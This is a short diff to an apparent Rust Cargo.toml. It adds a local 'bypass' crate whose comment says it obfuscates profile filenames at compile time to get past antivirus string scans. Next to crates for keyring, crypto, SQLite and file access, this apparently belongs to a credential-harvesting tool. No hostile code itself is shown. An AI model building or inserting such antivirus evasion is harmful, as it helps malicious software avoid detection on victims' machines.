@@ -12,6 +12,8 @@ hbd_core = { path = "../core" }
 keyring = { path = "../keyring" }
 hbd_crypto = { path = "../crypto", package = "crypto" }
 filemanager = { path = "../filemanager" }
+# Compile-time string obfuscation for profile filenames (AV string scan).
+bypass = { path = "../bypass" }
 thiserror = { workspace = true }
 rusqlite = { workspace = true }
 glob = { workspace = true }
